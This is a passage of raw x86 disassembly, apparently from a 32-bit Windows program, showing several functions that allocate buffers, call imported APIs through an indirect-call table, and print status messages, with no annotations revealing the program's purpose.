  407130:	test   esi,esi
  407132:	js     0x4071ea
  407138:	xor    eax,eax
  40713a:	xor    esi,esi
  40713c:	push   0x208
  407141:	mov    WORD PTR [ebp-0x218],ax
  407148:	lea    eax,[ebp-0x216]
  40714e:	push   esi
  40714f:	push   eax
  407150:	call   0x412060
  407155:	add    esp,0xc
  407158:	lea    eax,[ebp-0x228]
  40715e:	push   eax
  40715f:	push   esi
  407160:	push   esi
  407161:	push   esi
  407162:	lea    eax,[ebp-0x220]
  407168:	push   eax
  407169:	lea    eax,[ebp-0x218]
  40716f:	push   eax
  407170:	push   esi
  407171:	jmp    0x40719f
  407173:	mov    ecx,DWORD PTR [ebp-0x21c]
  407179:	lea    edx,[ebp-0x218]
  40717f:	call   0x4070ef
  407184:	lea    eax,[ebp-0x228]
  40718a:	xor    ecx,ecx
  40718c:	push   eax
  40718d:	push   ecx
  40718e:	push   ecx
  40718f:	push   ecx
  407190:	lea    eax,[ebp-0x220]
  407196:	push   eax
  407197:	lea    eax,[ebp-0x218]
  40719d:	push   eax
  40719e:	push   ecx
  40719f:	push   DWORD PTR [ebp-0x21c]
  4071a5:	mov    DWORD PTR [ebp-0x220],0x104
  4071af:	call   DWORD PTR ds:0x414018
  4071b5:	mov    esi,eax
  4071b7:	cmp    esi,0x103
  4071bd:	jne    0x407173
  4071bf:	push   DWORD PTR [ebp-0x21c]
  4071c5:	call   DWORD PTR ds:0x414008
  4071cb:	test   esi,esi
  4071cd:	je     0x4071d3
  4071cf:	cmp    esi,esi
  4071d1:	jne    0x4071dd
  4071d3:	push   ebx
  4071d4:	push   edi
  4071d5:	call   DWORD PTR ds:0x414014
  4071db:	mov    esi,eax
  4071dd:	test   esi,esi
  4071df:	jle    0x4071ea
  4071e1:	movzx  esi,si
  4071e4:	or     esi,0x80070000
  4071ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4071ed:	mov    eax,esi
  4071ef:	pop    edi
  4071f0:	pop    esi
  4071f1:	xor    ecx,ebp
  4071f3:	pop    ebx
  4071f4:	call   0x411980
  4071f9:	mov    esp,ebp
  4071fb:	pop    ebp
  4071fc:	ret    
  4071fd:	int3   
  4071fe:	int3   
  4071ff:	int3   
  407200:	int3   
  407201:	int3   
  407202:	mov    edi,edi
  407204:	push   ebp
  407205:	mov    ebp,esp
  407207:	mov    eax,0x1dcc
  40720c:	call   0x412030
  407211:	mov    eax,ds:0x413004
  407216:	xor    eax,ebp
  407218:	mov    DWORD PTR [ebp-0x4],eax
  40721b:	push   ebx
  40721c:	push   esi
  40721d:	mov    DWORD PTR [ebp-0x1dcc],ecx
  407223:	lea    ecx,[ebp-0x788]
  407229:	push   edi
  40722a:	mov    edi,DWORD PTR [ebp+0x8]
  40722d:	mov    DWORD PTR [ebp-0x1dac],edx
  407233:	call   0x40fa55
  407238:	xor    ebx,ebx
  40723a:	xor    esi,esi
  40723c:	cmp    DWORD PTR [ebp-0x1dac],ebx
  407242:	je     0x4075eb
  407248:	test   edi,edi
  40724a:	je     0x407257
  40724c:	xor    eax,eax
  40724e:	cmp    ax,WORD PTR [edi]
  407251:	je     0x4075eb
  407257:	lea    eax,[ebp-0x1db4]
  40725d:	push   eax
  40725e:	push   0x0
  407260:	push   0x0
  407262:	lea    eax,[ebp-0x1dbc]
  407268:	push   eax
  407269:	lea    edx,[ebp-0x1da4]
  40726f:	lea    ecx,[ebp-0x1dc4]
  407275:	call   0x4086b2
  40727a:	test   eax,eax
  40727c:	jne    0x407297
  40727e:	push   0x401868
  407283:	push   DWORD PTR ds:0x4130e8
  407289:	call   0x40e818
  40728e:	pop    ecx
  40728f:	pop    ecx
  407290:	xor    esi,esi
  407292:	jmp    0x4075b0
  407297:	and    DWORD PTR [ebp-0x1da8],ebx
  40729d:	mov    eax,0x418
  4072a2:	push   eax
  4072a3:	mov    DWORD PTR [ebp-0x1dc0],eax
  4072a9:	call   DWORD PTR ds:0x4141b0
  4072af:	mov    ebx,eax
  4072b1:	mov    DWORD PTR [ebp-0x1db8],ebx
  4072b7:	test   ebx,ebx
  4072b9:	je     0x4075b0
  4072bf:	mov    ecx,DWORD PTR [ebp-0x1da4]
  4072c5:	lea    eax,[ebp-0x1da8]
  4072cb:	push   eax
  4072cc:	lea    eax,[ebp-0x1dc0]
  4072d2:	mov    DWORD PTR [ebx],0x418
  4072d8:	push   eax
  4072d9:	push   ebx
  4072da:	push   edi
  4072db:	push   0x0
  4072dd:	call   DWORD PTR ds:0x414220
  4072e3:	call   DWORD PTR [ebp-0x1da4]
  4072e9:	cmp    eax,0x25b
  4072ee:	jne    0x40732a
  4072f0:	imul   eax,DWORD PTR [ebp-0x1da8],0x418
  4072fa:	push   eax
  4072fb:	push   0x4018c8
  407300:	push   DWORD PTR ds:0x4130e8
  407306:	call   0x40e818
  40730b:	add    esp,0xc
  40730e:	push   ebx
  40730f:	call   DWORD PTR ds:0x4141bc
  407315:	imul   eax,DWORD PTR [ebp-0x1da8],0x418
  40731f:	and    DWORD PTR [ebp-0x1da8],esi
  407325:	jmp    0x4072a2
  40732a:	test   eax,eax
  40732c:	jne    0x4075d5
  407332:	push   DWORD PTR [ebp-0x1da8]
  407338:	push   0x401970
  40733d:	push   DWORD PTR ds:0x4130e8
  407343:	call   0x40e818
  407348:	add    esp,0xc
  40734b:	push   DWORD PTR [ebp-0x1dac]
  407351:	call   DWORD PTR ds:0x414068
  407357:	and    DWORD PTR [ebp-0x1db0],0x0
  40735e:	cmp    DWORD PTR [ebp-0x1da8],0x0
  407365:	mov    DWORD PTR [ebp-0x1da4],0x1
  40736f:	lea    esi,[eax+0x1]
  407372:	mov    DWORD PTR [ebp-0x1dc8],esi
  407378:	jbe    0x4075aa
  40737e:	add    ebx,0x4
  407381:	mov    eax,edi
  407383:	test   edi,edi
  407385:	jne    0x40738c
  407387:	mov    eax,0x401a80
  40738c:	push   eax
  40738d:	push   ebx
  40738e:	push   0x401a90
  407393:	push   DWORD PTR ds:0x4130e8
  407399:	call   0x40e818
  40739e:	add    esp,0x10
  4073a1:	mov    edx,0x105
  4073a6:	cmp    DWORD PTR [ebp+0xc],0x0
  4073aa:	je     0x4073be
  4073ac:	sub    esp,0xc
  4073af:	lea    ecx,[ebp-0x218]
  4073b5:	push   esi
  4073b6:	push   ebx
  4073b7:	call   0x410ef7
  4073bc:	jmp    0x4073d1
  4073be:	push   0x900
  4073c3:	push   ecx
  4073c4:	push   ecx
  4073c5:	push   ebx
  4073c6:	lea    ecx,[ebp-0x218]
  4073cc:	call   0x410ebe
  4073d1:	test   eax,eax
  4073d3:	js     0x4075cc
  4073d9:	push   DWORD PTR [ebp-0x1dac]
  4073df:	lea    eax,[ebp-0x218]
  4073e5:	push   eax
  4073e6:	call   DWORD PTR ds:0x414064
  4073ec:	test   eax,eax
  4073ee:	jne    0x40757f
  4073f4:	push   0x428
  4073f9:	push   eax
  4073fa:	lea    eax,[ebp-0x644]
  407400:	push   eax
  407401:	call   0x412060
  407406:	mov    esi,DWORD PTR [ebp-0x1dcc]
  40740c:	lea    eax,[ebp-0x648]
  407412:	add    esp,0xc
  407415:	mov    DWORD PTR [ebp-0x648],0x21c
  40741f:	mov    DWORD PTR [ebp-0x644],0x7
  407429:	push   0x1
  40742b:	push   eax
  40742c:	push   ebx
  40742d:	test   esi,esi
  40742f:	je     0x40743c
  407431:	mov    edx,edi
  407433:	mov    ecx,esi
  407435:	call   0x409321
  40743a:	jmp    0x40744f
  40743c:	mov    ecx,DWORD PTR [ebp-0x1db4]
  407442:	push   edi
  407443:	call   DWORD PTR ds:0x414220
  407449:	call   DWORD PTR [ebp-0x1db4]
  40744f:	push   0x1614
  407454:	lea    eax,[ebp-0x1d9c]
  40745a:	push   0x0
  40745c:	push   eax
  40745d:	call   0x412060
  407462:	add    esp,0xc
  407465:	mov    DWORD PTR [ebp-0xff8],0x4
  40746f:	mov    eax,0x1618
  407474:	mov    DWORD PTR [ebp-0x1da0],eax
  40747a:	test   esi,esi
  40747c:	je     0x407491
  40747e:	lea    eax,[ebp-0x1da0]
  407484:	mov    edx,edi
  407486:	push   eax
  407487:	push   ebx
  407488:	mov    ecx,esi
  40748a:	call   0x4093ce
  40748f:	jmp    0x4074b1
  407491:	mov    ecx,DWORD PTR [ebp-0x1dbc]
  407497:	push   0x0
  407499:	push   0x0
  40749b:	push   eax
  40749c:	lea    eax,[ebp-0x1da0]
  4074a2:	push   eax
  4074a3:	push   ebx
  4074a4:	push   edi
  4074a5:	call   DWORD PTR ds:0x414220
  4074ab:	call   DWORD PTR [ebp-0x1dbc]
  4074b1:	mov    ecx,eax
  4074b3:	mov    eax,edi
  4074b5:	test   ecx,ecx
  4074b7:	je     0x4074e4
  4074b9:	test   edi,edi
  4074bb:	jne    0x4074c2
  4074bd:	mov    eax,0x401a80
  4074c2:	push   ecx
  4074c3:	push   eax
  4074c4:	push   ebx
  4074c5:	push   0x401b08
  4074ca:	push   DWORD PTR ds:0x4130e8
  4074d0:	call   0x40e818
  4074d5:	add    esp,0x14
  4074d8:	and    DWORD PTR [ebp-0x1da4],0x0
  4074df:	jmp    0x407585
  4074e4:	test   edi,edi
  4074e6:	jne    0x4074ed
  4074e8:	mov    eax,0x401a80
  4074ed:	push   eax
  4074ee:	push   ebx
  4074ef:	push   0x401bb8
  4074f4:	push   DWORD PTR ds:0x4130e8
  4074fa:	call   0x40e818
  4074ff:	add    esp,0x10
  407502:	push   ebx
  407503:	push   edi
  407504:	test   esi,esi
  407506:	je     0x40751f
  407508:	mov    eax,DWORD PTR [esi]
  40750a:	push   esi
  40750b:	mov    esi,DWORD PTR [eax+0x14]
  40750e:	mov    ecx,esi
  407510:	call   DWORD PTR ds:0x414220
  407516:	call   esi
  407518:	and    eax,0xffff
  40751d:	jmp    0x407531
  40751f:	mov    ecx,DWORD PTR [ebp-0x1dc4]
  407525:	call   DWORD PTR ds:0x414220
  40752b:	call   DWORD PTR [ebp-0x1dc4]
  407531:	test   eax,eax
  407533:	je     0x40755f
  407535:	mov    ecx,edi
  407537:	test   edi,edi
  407539:	jne    0x407540
  40753b:	mov    ecx,0x401a80
  407540:	push   eax
  407541:	push   ecx
  407542:	push   ebx
  407543:	push   0x401c88
  407548:	push   DWORD PTR ds:0x4130e8
  40754e:	call   0x40e818
  407553:	add    esp,0x14
  407556:	and    DWORD PTR [ebp-0x1da4],0x0
  40755d:	jmp    0x40757f
  40755f:	mov    eax,edi
  407561:	test   edi,edi
  407563:	jne    0x40756a
  407565:	mov    eax,0x401a80
  40756a:	push   eax
  40756b:	push   ebx
  40756c:	push   0x401d28
  407571:	push   DWORD PTR ds:0x4130e8
  407577:	call   0x40e818
  40757c:	add    esp,0x10
  40757f:	add    ebx,0x418
  407585:	mov    eax,DWORD PTR [ebp-0x1db0]
  40758b:	mov    esi,DWORD PTR [ebp-0x1dc8]
  407591:	inc    eax
  407592:	mov    DWORD PTR [ebp-0x1db0],eax
  407598:	cmp    eax,DWORD PTR [ebp-0x1da8]
  40759e:	jb     0x407381
  4075a4:	mov    ebx,DWORD PTR [ebp-0x1db8]
  4075aa:	mov    esi,DWORD PTR [ebp-0x1da4]
  4075b0:	push   ebx
  4075b1:	call   DWORD PTR ds:0x4141bc
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	mov    eax,esi
  4075bc:	pop    edi
  4075bd:	pop    esi
  4075be:	xor    ecx,ebp
  4075c0:	pop    ebx
  4075c1:	call   0x411980
  4075c6:	mov    esp,ebp
  4075c8:	pop    ebp
  4075c9:	ret    0x8
  4075cc:	and    DWORD PTR [ebp-0x1da4],0x0
  4075d3:	jmp    0x4075a4
  4075d5:	push   eax
  4075d6:	push   0x401a08
  4075db:	push   DWORD PTR ds:0x4130e8
  4075e1:	call   0x40e818
  4075e6:	add    esp,0xc
  4075e9:	jmp    0x4075b0
  4075eb:	push   0x4017f8
  4075f0:	push   DWORD PTR ds:0x4130e8
  4075f6:	call   0x40e818
  4075fb:	pop    ecx
  4075fc:	pop    ecx
  4075fd:	jmp    0x4075b0
  4075ff:	int3   
  407600:	int3   
  407601:	int3   
  407602:	int3   
  407603:	int3   
  407604:	mov    edi,edi
  407606:	push   ebp
  407607:	mov    ebp,esp
  407609:	sub    esp,0x57c
  40760f:	mov    eax,ds:0x413004
  407614:	xor    eax,ebp
  407616:	mov    DWORD PTR [ebp-0x4],eax
  407619:	mov    eax,DWORD PTR [ebp+0xc]
  40761c:	push   ebx
  40761d:	mov    ebx,DWORD PTR [ebp+0x8]
  407620:	push   esi
  407621:	mov    esi,ecx
  407623:	mov    DWORD PTR [ebp-0x55c],eax
  407629:	push   edi
  40762a:	lea    ecx,[ebp-0x558]
  407630:	mov    edi,edx
  407632:	call   0x40fa55
  407637:	push   0x20a
  40763c:	lea    eax,[ebp-0x210]
  407642:	push   0x0
  407644:	push   eax
  407645:	call   0x412060
  40764a:	add    esp,0xc
  40764d:	lea    ecx,[ebp-0x558]
  407653:	call   0x40fb10
  407658:	test   eax,eax
  40765a:	lea    eax,[ebp-0x41c]
  407660:	push   0x104
  407665:	push   eax
  407666:	je     0x407689
  407668:	push   0xf3
  40766d:	push   edi
  40766e:	call   DWORD PTR ds:0x414188
  407674:	lea    eax,[ebp-0x41c]
  40767a:	push   eax
  40767b:	push   ebx
  40767c:	push   DWORD PTR [ebp-0x55c]
  407682:	push   0x401d8c
  407687:	jmp    0x4076a8
  407689:	push   0xc9
  40768e:	push   edi
  40768f:	call   DWORD PTR ds:0x414188
  407695:	push   ebx
  407696:	lea    eax,[ebp-0x41c]
  40769c:	push   eax
  40769d:	push   DWORD PTR [ebp-0x55c]
  4076a3:	push   0x401dac
  4076a8:	push   0x900
  4076ad:	push   0x0
  4076af:	push   0x0
  4076b1:	lea    eax,[ebp-0x210]
  4076b7:	push   0x105
  4076bc:	push   eax
  4076bd:	call   0x410f98
  4076c2:	add    esp,0x24
  4076c5:	test   esi,esi
  4076c7:	je     0x4076e2
  4076c9:	mov    eax,DWORD PTR [esi]
  4076cb:	lea    ecx,[ebp-0x210]
  4076d1:	push   ecx
  4076d2:	push   esi
  4076d3:	mov    esi,DWORD PTR [eax+0x10]
  4076d6:	mov    ecx,esi
  4076d8:	call   DWORD PTR ds:0x414220
  4076de:	call   esi
  4076e0:	jmp    0x407734
  4076e2:	push   0x80
  4076e7:	lea    eax,[ebp-0x210]
  4076ed:	push   eax
  4076ee:	call   DWORD PTR ds:0x414090
  4076f4:	test   eax,eax
  4076f6:	je     0x407734
  4076f8:	push   0x7
  4076fa:	pop    ecx
  4076fb:	xor    eax,eax
  4076fd:	lea    edi,[ebp-0x57c]
  407703:	rep stos DWORD PTR es:[edi],eax
  407705:	push   0x14
  407707:	stos   WORD PTR es:[edi],ax
  407709:	lea    eax,[ebp-0x210]
  40770f:	mov    DWORD PTR [ebp-0x574],eax
  407715:	pop    eax
  407716:	mov    WORD PTR [ebp-0x56c],ax
  40771d:	lea    eax,[ebp-0x57c]
  407723:	push   eax
  407724:	mov    DWORD PTR [ebp-0x578],0x3
  40772e:	call   DWORD PTR ds:0x414138
  407734:	mov    ecx,DWORD PTR [ebp-0x4]
  407737:	pop    edi
  407738:	pop    esi
  407739:	xor    ecx,ebp
  40773b:	pop    ebx
  40773c:	call   0x411980
  407741:	mov    esp,ebp
  407743:	pop    ebp
  407744:	ret    0x8
  407747:	int3   
  407748:	int3   
  407749:	int3   
  40774a:	int3   
  40774b:	int3   
  40774c:	mov    edi,edi
  40774e:	push   ebp
  40774f:	mov    ebp,esp
  407751:	sub    esp,0x22c
  407757:	mov    eax,ds:0x413004
  40775c:	xor    eax,ebp
  40775e:	mov    DWORD PTR [ebp-0x4],eax
  407761:	push   ebx
  407762:	mov    ebx,DWORD PTR [ebp+0x8]
  407765:	mov    eax,edx
  407767:	xor    edx,edx
  407769:	mov    DWORD PTR [ebp-0x214],eax
  40776f:	mov    DWORD PTR [ebp-0x228],ecx
  407775:	mov    DWORD PTR [ebp-0x22c],ebx
  40777b:	mov    DWORD PTR [ebp-0x220],edx
  407781:	mov    DWORD PTR [ebp-0x218],edx
  407787:	push   esi
  407788:	mov    esi,0x80004005
  40778d:	push   edi
  40778e:	test   eax,eax
  407790:	je     0x407994
  407796:	xor    ecx,ecx
  407798:	cmp    cx,WORD PTR [eax]
  40779b:	je     0x407994
  4077a1:	test   ebx,ebx
  4077a3:	je     0x4077b0
  4077a5:	xor    eax,eax
  4077a7:	cmp    ax,WORD PTR [ebx]
  4077aa:	je     0x407994
  4077b0:	push   edx
  4077b1:	lea    eax,[ebp-0x218]
  4077b7:	xor    ecx,ecx
  4077b9:	push   eax
  4077ba:	push   edx
  4077bb:	push   edx
  4077bc:	xor    edx,edx
  4077be:	call   0x4086b2
  4077c3:	test   eax,eax
  4077c5:	jne    0x4077d1
  4077c7:	mov    eax,0x8000ffff
  4077cc:	jmp    0x407999
  4077d1:	push   0x1618
  4077d6:	call   DWORD PTR ds:0x4141b0
  4077dc:	mov    edi,eax
  4077de:	mov    DWORD PTR [ebp-0x224],eax
  4077e4:	test   edi,edi
  4077e6:	je     0x407990
  4077ec:	push   0x1618
  4077f1:	push   0x0
  4077f3:	push   edi
  4077f4:	call   0x412060
  4077f9:	mov    ecx,DWORD PTR [ebp-0x218]
  4077ff:	add    esp,0xc
  407802:	mov    eax,0x1618
  407807:	mov    DWORD PTR [edi],eax
  407809:	mov    DWORD PTR [ebp-0x21c],eax
  40780f:	lea    eax,[ebp-0x21c]
  407815:	push   0x0
  407817:	push   0x0
  407819:	push   eax
  40781a:	push   edi
  40781b:	push   DWORD PTR [ebp-0x214]
  407821:	push   ebx
  407822:	call   DWORD PTR ds:0x414220
  407828:	call   DWORD PTR [ebp-0x218]
  40782e:	mov    ebx,eax
  407830:	cmp    ebx,0x25b
  407836:	jne    0x40789d
  407838:	push   edi
  407839:	call   DWORD PTR ds:0x4141bc
  40783f:	push   DWORD PTR [ebp-0x21c]
  407845:	call   DWORD PTR ds:0x4141b0
  40784b:	mov    edi,eax
  40784d:	mov    DWORD PTR [ebp-0x224],edi
  407853:	test   edi,edi
  407855:	je     0x40796b
  40785b:	push   DWORD PTR [ebp-0x21c]
  407861:	xor    ebx,ebx
  407863:	push   ebx
  407864:	push   edi
  407865:	call   0x412060
  40786a:	mov    ecx,DWORD PTR [ebp-0x218]
  407870:	lea    eax,[ebp-0x21c]
  407876:	add    esp,0xc
  407879:	mov    DWORD PTR [edi],0x1618
  40787f:	push   ebx
  407880:	push   ebx
  407881:	push   eax
  407882:	push   edi
  407883:	push   DWORD PTR [ebp-0x214]
  407889:	push   DWORD PTR [ebp-0x22c]
  40788f:	call   DWORD PTR ds:0x414220
  407895:	call   DWORD PTR [ebp-0x218]
  40789b:	mov    ebx,eax
  40789d:	test   ebx,ebx
  40789f:	jne    0x40796b
  4078a5:	lea    edx,[ebp-0x214]
  4078ab:	xor    ecx,ecx
  4078ad:	call   0x4088cd
  4078b2:	test   eax,eax
  4078b4:	je     0x407984
  4078ba:	mov    eax,DWORD PTR [ebp+0xc]
  4078bd:	mov    ecx,DWORD PTR [ebp-0x214]
  4078c3:	neg    eax
  4078c5:	push   ebx
  4078c6:	sbb    eax,eax
  4078c8:	and    eax,0x9
  4078cb:	add    eax,0x10
  4078ce:	push   eax
  4078cf:	lea    eax,[ebp-0x210]
  4078d5:	push   eax
  4078d6:	push   ebx
  4078d7:	call   DWORD PTR ds:0x414220
  4078dd:	call   DWORD PTR [ebp-0x214]
  4078e3:	mov    esi,eax
  4078e5:	test   esi,esi
  4078e7:	js     0x407984
  4078ed:	mov    eax,DWORD PTR [ebp-0x228]
  4078f3:	test   eax,eax
  4078f5:	je     0x40791e
  4078f7:	mov    ebx,DWORD PTR [eax]
  4078f9:	lea    ecx,[ebp-0x210]
  4078ff:	push   ecx
  407900:	lea    esi,[edi+0xdb4]
  407906:	sub    esp,0x10
  407909:	mov    edi,esp
  40790b:	mov    ecx,DWORD PTR [ebx+0xc]
  40790e:	push   eax
  40790f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407913:	call   DWORD PTR ds:0x414220
  407919:	call   DWORD PTR [ebx+0xc]
  40791c:	jmp    0x407950
  40791e:	push   ebx
  40791f:	lea    edx,[ebp-0x220]
  407925:	xor    ecx,ecx
  407927:	call   0x408566
  40792c:	test   eax,eax
  40792e:	je     0x407954
  407930:	mov    ecx,DWORD PTR [ebp-0x220]
  407936:	lea    eax,[ebp-0x210]
  40793c:	push   eax
  40793d:	lea    eax,[edi+0xdb4]
  407943:	push   eax
  407944:	call   DWORD PTR ds:0x414220
  40794a:	call   DWORD PTR [ebp-0x220]
  407950:	mov    esi,eax
  407952:	jmp    0x407984
  407954:	call   DWORD PTR ds:0x414074
  40795a:	mov    esi,eax
  40795c:	test   esi,esi
  40795e:	jle    0x407984
  407960:	movzx  esi,si
  407963:	or     esi,0x80070000
  407969:	jmp    0x407984
  40796b:	push   ebx
  40796c:	push   0x401dc8
  407971:	push   DWORD PTR ds:0x4130e8
  407977:	call   0x40e818
  40797c:	add    esp,0xc
  40797f:	mov    esi,0x800704cd
  407984:	push   DWORD PTR [ebp-0x224]
  40798a:	call   DWORD PTR ds:0x4141bc
  407990:	mov    eax,esi
  407992:	jmp    0x407999
  407994:	mov    eax,0x80070057
  407999:	mov    ecx,DWORD PTR [ebp-0x4]
  40799c:	pop    edi
  40799d:	pop    esi
  40799e:	xor    ecx,ebp
  4079a0:	pop    ebx
  4079a1:	call   0x411980
  4079a6:	mov    esp,ebp
  4079a8:	pop    ebp
  4079a9:	ret    0x8
  4079ac:	int3   
  4079ad:	int3   
  4079ae:	int3   
  4079af:	int3   
  4079b0:	int3   
  4079b1:	mov    edi,edi
  4079b3:	push   ebp
  4079b4:	mov    ebp,esp
  4079b6:	sub    esp,0xecc
  4079bc:	mov    eax,ds:0x413004
  4079c1:	xor    eax,ebp
  4079c3:	mov    DWORD PTR [ebp-0x4],eax
  4079c6:	push   ebx
  4079c7:	push   esi
  4079c8:	mov    esi,DWORD PTR [ebp+0xc]
  4079cb:	push   edi
  4079cc:	mov    edi,DWORD PTR [ebp+0x8]
  4079cf:	mov    DWORD PTR [ebp-0xec8],ecx
  4079d5:	lea    ecx,[ebp-0x688]
  4079db:	mov    DWORD PTR [ebp-0xeb4],edx
  4079e1:	mov    DWORD PTR [ebp-0xecc],edi
  4079e7:	mov    DWORD PTR [ebp-0xeb0],esi
  4079ed:	call   0x40fa55
  4079f2:	mov    ecx,DWORD PTR [ebp-0xeb4]
  4079f8:	xor    ebx,ebx
  4079fa:	test   ecx,ecx
  4079fc:	je     0x407eab
  407a02:	test   esi,esi
  407a04:	je     0x407eab
  407a0a:	mov    eax,edi
  407a0c:	test   edi,edi
  407a0e:	jne    0x407a15
  407a10:	mov    eax,0x401e44
  407a15:	push   eax
  407a16:	push   ecx
  407a17:	push   0x401e58
  407a1c:	push   DWORD PTR ds:0x4130e8
  407a22:	call   0x40e818
  407a27:	add    esp,0x10
  407a2a:	lea    eax,[ebp-0xeac]
  407a30:	xor    edx,edx
  407a32:	xor    ecx,ecx
  407a34:	push   ebx
  407a35:	push   ebx
  407a36:	push   ebx
  407a37:	push   eax
  407a38:	call   0x4086b2
  407a3d:	test   eax,eax
  407a3f:	je     0x407eab
  407a45:	push   0x8
  407a47:	pop    ecx
  407a48:	xor    eax,eax
  407a4a:	lea    edi,[ebp-0x28]
  407a4d:	rep stos DWORD PTR es:[edi],eax
  407a4f:	push   0x102
  407a54:	push   ebx
  407a55:	stos   WORD PTR es:[edi],ax
  407a57:	lea    eax,[ebp-0x130]
  407a5d:	push   eax
  407a5e:	call   0x412060
  407a63:	push   0x208
  407a68:	lea    eax,[ebp-0x338]
  407a6e:	push   ebx
  407a6f:	push   eax
  407a70:	call   0x412060
  407a75:	add    esp,0x18
  407a78:	mov    edx,0x104
  407a7d:	push   0x900
  407a82:	push   ecx
  407a83:	push   ecx
  407a84:	push   0x4014f8
  407a89:	lea    ecx,[ebp-0x338]
  407a8f:	call   0x410ebe
  407a94:	test   eax,eax
  407a96:	js     0x407ea7
  407a9c:	push   esi
  407a9d:	push   0x1
  407a9f:	push   0x401538
  407aa4:	push   0x401498
  407aa9:	call   DWORD PTR ds:0x414070
  407aaf:	mov    edi,DWORD PTR [ebp-0xeb0]
  407ab5:	mov    esi,eax
  407ab7:	push   edi
  407ab8:	push   0x1
  407aba:	push   0x401548
  407abf:	push   0x401498
  407ac4:	call   DWORD PTR ds:0x414070
  407aca:	mov    DWORD PTR [ebp-0xeb0],eax
  407ad0:	test   esi,esi
  407ad2:	je     0x407bd1
  407ad8:	test   eax,eax
  407ada:	je     0x407af6
  407adc:	push   edi
  407add:	push   ebx
  407ade:	push   0x401558
  407ae3:	push   0x401498
  407ae8:	call   DWORD PTR ds:0x414070
  407aee:	test   eax,eax
  407af0:	jne    0x407bd1
  407af6:	push   ebx
  407af7:	push   ecx
  407af8:	lea    eax,[ebp-0x130]
  407afe:	mov    esi,ebx
  407b00:	push   eax
  407b01:	lea    ecx,[ebp-0x28]
  407b04:	call   0x407fd6
  407b09:	test   eax,eax
  407b0b:	jne    0x407b2b
  407b0d:	push   0x401ef0
  407b12:	push   DWORD PTR ds:0x4130e8
  407b18:	call   0x40e818
  407b1d:	pop    ecx
  407b1e:	pop    ecx
  407b1f:	cmp    DWORD PTR [ebp-0xeb0],ebx
  407b25:	jne    0x407bd4
  407b2b:	cmp    WORD PTR [ebp-0x28],bx
  407b2f:	jne    0x407b92
  407b31:	push   0x900
  407b36:	push   ecx
  407b37:	push   ecx
  407b38:	push   0x401fa4
  407b3d:	push   0x11
  407b3f:	pop    edx
  407b40:	lea    ecx,[ebp-0x28]
  407b43:	call   0x410ebe
  407b48:	test   eax,eax
  407b4a:	js     0x407ea7
  407b50:	push   0x900
  407b55:	push   ecx
  407b56:	push   ecx
  407b57:	push   0x401fb0
  407b5c:	mov    edx,0x81
  407b61:	lea    ecx,[ebp-0x130]
  407b67:	call   0x410ebe
  407b6c:	test   eax,eax
  407b6e:	js     0x407ea7
  407b74:	lea    eax,[ebp-0x130]
  407b7a:	push   eax
  407b7b:	lea    eax,[ebp-0x28]
  407b7e:	push   eax
  407b7f:	push   0x401fe0
  407b84:	push   DWORD PTR ds:0x4130e8
  407b8a:	call   0x40e818
  407b8f:	add    esp,0x10
  407b92:	mov    edi,0x1618
  407b97:	push   edi
  407b98:	call   DWORD PTR ds:0x4141b0
  407b9e:	mov    esi,eax
  407ba0:	cmp    DWORD PTR [ebp-0xec8],ebx
  407ba6:	je     0x407df1
  407bac:	mov    DWORD PTR [ebp-0xeb0],esi
  407bb2:	test   esi,esi
  407bb4:	jne    0x407cb3
  407bba:	push   0x402050
  407bbf:	push   DWORD PTR ds:0x4130e8
  407bc5:	call   0x40e818
  407bca:	pop    ecx
  407bcb:	pop    ecx
  407bcc:	jmp    0x407ea7
  407bd1:	xor    esi,esi
  407bd3:	inc    esi
  407bd4:	push   0x1
  407bd6:	push   ecx
  407bd7:	lea    eax,[ebp-0x130]
  407bdd:	push   eax
  407bde:	lea    ecx,[ebp-0x28]
  407be1:	call   0x407fd6
  407be6:	test   eax,eax
  407be8:	jne    0x407c01
  407bea:	push   0x401f48
  407bef:	push   DWORD PTR ds:0x4130e8
  407bf5:	call   0x40e818
  407bfa:	pop    ecx
  407bfb:	pop    ecx
  407bfc:	jmp    0x407b2b
  407c01:	test   esi,esi
  407c03:	jne    0x407b2b
  407c09:	push   edi
  407c0a:	lea    ecx,[ebp-0xea8]
  407c10:	call   0x40eb66
  407c15:	lea    eax,[ebp-0xc94]
  407c1b:	mov    esi,0x105
  407c20:	push   eax
  407c21:	lea    eax,[ebp-0xc9e]
  407c27:	push   eax
  407c28:	push   0x401f98
  407c2d:	push   0x900
  407c32:	push   ebx
  407c33:	push   ebx
  407c34:	lea    eax,[ebp-0x548]
  407c3a:	push   esi
  407c3b:	push   eax
  407c3c:	call   0x410f98
  407c41:	add    esp,0x20
  407c44:	test   eax,eax
  407c46:	js     0x407ea7
  407c4c:	lea    eax,[ebp-0x548]
  407c52:	push   eax
  407c53:	call   DWORD PTR ds:0x414068
  407c59:	lea    eax,[eax*2-0x2]
  407c60:	cmp    eax,0x20a
  407c65:	jae    0x407ec0
  407c6b:	sub    esp,0xc
  407c6e:	xor    ecx,ecx
  407c70:	mov    WORD PTR [ebp+eax*1-0x548],cx
  407c78:	mov    edx,esi
  407c7a:	lea    ecx,[ebp-0x548]
  407c80:	push   0x401578
  407c85:	call   0x410f31
  407c8a:	test   eax,eax
  407c8c:	js     0x407ea7
  407c92:	lea    eax,[ebp-0x548]
  407c98:	push   eax
  407c99:	push   0x4011bc
  407c9e:	push   0x401558
  407ca3:	push   0x401498
  407ca8:	call   DWORD PTR ds:0x41406c
  407cae:	jmp    0x407b2b
  407cb3:	push   edi
  407cb4:	push   ebx
  407cb5:	push   esi
  407cb6:	call   0x412060
  407cbb:	add    esp,0xc
  407cbe:	mov    DWORD PTR [esi],edi
  407cc0:	lea    eax,[ebp-0x28]
  407cc3:	mov    DWORD PTR [esi+0xda8],0x4
  407ccd:	mov    edi,0x40143c
  407cd2:	mov    DWORD PTR [ebp-0xebc],eax
  407cd8:	mov    DWORD PTR [ebp-0xec4],edi
  407cde:	push   0x900
  407ce3:	push   ecx
  407ce4:	push   ecx
  407ce5:	push   eax
  407ce6:	push   0x11
  407ce8:	lea    ecx,[esi+0x764]
  407cee:	mov    DWORD PTR [ebp-0xec0],eax
  407cf4:	pop    edx
